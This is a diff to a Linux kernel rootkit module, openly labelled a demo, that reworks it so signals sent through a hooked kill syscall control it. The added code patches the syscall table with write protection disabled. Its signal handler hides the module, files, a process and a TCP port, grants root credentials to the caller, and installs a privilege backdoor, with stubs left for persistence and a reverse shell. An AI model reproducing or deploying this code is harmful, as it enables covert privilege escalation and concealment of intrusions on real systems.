@@ -35,6 +35,19 @@ MODULE_AUTHOR("Mote");
 MODULE_DESCRIPTION("A Simple LKM Rootkit Demo");
 
 
+
+# define ROOT_PATH "/"
+# define SECRET_FILE "Hidden_"
+# define PROC_PATH "/proc"
+# define SECRET_PROC 8123
+
+# define SECRET_PORT 10000
+
+
+
+
+
+
 // ========== WRITE_PROTECTION HELPER ==========
 void
 disable_wp(void)
@@ -232,51 +245,6 @@ unsigned long **sct;
 
 
 
-/**
-kill钩子
-**/
-asmlinkage int fake_kill(pid_t pid, int sig);
-asmlinkage int (*real_kill)(pid_t pid, int sig);
-
-#define SIGROOT 48
-asmlinkage int fake_kill(pid_t pid, int sig){
-    switch(sig){
-        case SIGROOT:
-            commit_creds(prepare_kernel_cred(0));
-            break;
-	default:
-            return real_kill(pid,sig);
-
-    }
-    return 0;
-}
-
-
-/**
-挂钩与脱钩函数
-**/
-void
-hook_start(void)
-{
-	/* No consideration on failure. */
-	sct = get_sct();
-	//printk("sys_call_table_addr: %p\n",sct);
-	disable_wp();
-	HOOK_SCT(sct, kill);
-	enable_wp();
-	//pr_info("%s\n", "Hook Start!");
-}
-
-
-void
-hook_stop(void)
-{
-	disable_wp();
-	UNHOOK_SCT(sct, kill);
-	enable_wp();
-	//pr_info("%s\n", "Hook Stop!");
-}
-
 //========== END HOOK HELPER =================
 
 
@@ -310,8 +278,6 @@ hook_stop(void)
         }                                                   \
     }while(0)
 
-# define ROOT_PATH "/"
-# define SECRET_FILE "Hidden_"
 
 
 int 
@@ -348,8 +314,7 @@ int fake_filldir_file(struct dir_context *ctx, const char *name, int namlen,
     return real_filldir_file(ctx, name, namlen, offset, ino, d_type);
 }
 
-# define PROC_PATH "/proc"
-# define SECRET_PROC 8123
+
 
 int 
 (*real_iterate_shared_proc)(struct file *, struct dir_context *); 
@@ -391,34 +356,41 @@ int fake_filldir_proc(struct dir_context *ctx, const char *name, int namlen,
     return real_filldir_proc(ctx, name, namlen, offset, ino, d_type);
 }
 
-void hide_file_and_process_start(void)
+void hide_file_start(void)
 {
 	set_f_op(iterate_shared, ROOT_PATH, fake_iterate_shared_file, real_iterate_shared_file);
-    set_f_op(iterate_shared, PROC_PATH, fake_iterate_shared_proc, real_iterate_shared_proc);
+    
 	if(!real_iterate_shared_file){
 	    return -ENOENT;
 	}
 }
 
-void hide_file_and_process_stop(void)
+void hide_process_start(void)
+{
+    set_f_op(iterate_shared, PROC_PATH, fake_iterate_shared_proc, real_iterate_shared_proc);
+    if(!real_iterate_shared_proc){
+        return -ENOENT;
+    }
+}
+
+void hide_file_stop(void)
 {
 	if(real_iterate_shared_file){
 		void *dummy;
 		set_f_op(iterate_shared, ROOT_PATH, real_iterate_shared_file, dummy);
-        set_f_op(iterate_shared, PROC_PATH, real_iterate_shared_proc, dummy);
 	}
 }
 
+void hide_process_stop(void)
+{
+    if(real_iterate_shared_proc){
+        void *dummy;
+        set_f_op(iterate_shared, PROC_PATH, real_iterate_shared_proc, dummy);
+    }
+}
+
+
 //========== END HIDE FILE AND PROCESS MODULE =================
-
-
-
-
-
-
-
-
-
 
 
 
@@ -450,7 +422,7 @@ void hide_file_and_process_stop(void)
 
 
 # define NEEDLE_LEN  6
-# define SECRET_PORT 10000
+
 # define TMPSZ 150
 # define NET_ENTRY "/proc/net/tcp"
 # define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
@@ -472,12 +444,12 @@ int fake_seq_show(struct seq_file *seq, void *v)
     return ret;
 }
 
-void hideport_start(void)
+void hide_port_start(void)
 {
 	set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, fake_seq_show, real_seq_show);
 }
 
-void hideport_stop(void)
+void hide_port_stop(void)
 {
 	if(real_seq_show){
 		void *dummy;
@@ -601,23 +573,114 @@ static void create_files(void)
 //========== END CREATE FILE =================
 
 
+//========== KILL HOOK =================
+/**
+kill钩子
+**/
+asmlinkage int fake_kill(pid_t pid, int sig);
+asmlinkage int (*real_kill)(pid_t pid, int sig);
+
+
+#define SIGHIDEMODULE 50
+#define SIGUNHIDEMODULE 51
+#define SIGHIDEFILE 52
+#define SIGUNHIDEFILE 53
+#define SIGHIDEPROC 54
+#define SIGUNHIDEPROC 55
+#define SIGHIDEPORT 56
+#define SIGUNHIDEPORT 57
+#define SIGGETROOT 58
+#define SIGSETBACKDOOR 59
+#define SIGCLEANBACKDOOR 60
+#define SIGPERSISTENCE 61
+#define SIGREVERSESHELL 62
+
+asmlinkage int fake_kill(pid_t pid, int sig){
+    switch(sig){
+        case SIGHIDEMODULE:
+            module_hide();
+            break;
+        case SIGUNHIDEMODULE:
+            module_show();
+            break;
+        case SIGHIDEFILE: // 控制文件隐藏显示
+            hide_file_start();
+            break;
+        case SIGUNHIDEFILE:
+            hide_file_stop();
+            break;
+        case SIGHIDEPROC:
+            hide_process_start();
+            break; 
+        case SIGUNHIDEPROC:
+            hide_process_stop();
+            break;
+        case SIGHIDEPORT:
+            hide_port_start();
+            break;
+        case SIGUNHIDEPORT:
+            hide_port_stop();
+            break;
+        case SIGGETROOT:
+            commit_creds(prepare_kernel_cred(0));
+            break;
+        case SIGSETBACKDOOR:
+            set_priviledge_backdoor();
+            break;
+        case SIGCLEANBACKDOOR:
+            clean_priviledge_backdoor();
+            break;
+        case SIGPERSISTENCE:
+            break;
+        case SIGREVERSESHELL:
+            break;      
+        default:
+            return real_kill(pid,sig);
+
+    }
+    return 0;
+}
+
+
+/**
+挂钩与脱钩函数
+**/
+void
+hook_start(void)
+{
+    /* No consideration on failure. */
+    sct = get_sct();
+    //printk("sys_call_table_addr: %p\n",sct);
+    disable_wp();
+    HOOK_SCT(sct, kill);
+    enable_wp();
+    //pr_info("%s\n", "Hook Start!");
+}
+
+
+void
+hook_stop(void)
+{
+    disable_wp();
+    UNHOOK_SCT(sct, kill);
+    enable_wp();
+    //pr_info("%s\n", "Hook Stop!");
+}
+
+//========== END KILL HOOK =================
+
 
 //========== ROOTKIT START =================
 static int __init myrootkit_init(void)
 {
+	hook_start();
 	
-	set_priviledge_backdoor();
-	hideport_start();
-	hide_file_and_process_start();
 	return 0;
 }
 
 static void __exit myrootkit_exit(void)
 {
-	
-	clean_priviledge_backdoor();
-	hideport_stop();
-	hide_file_and_process_stop();
+	hook_stop();
 }
 
 
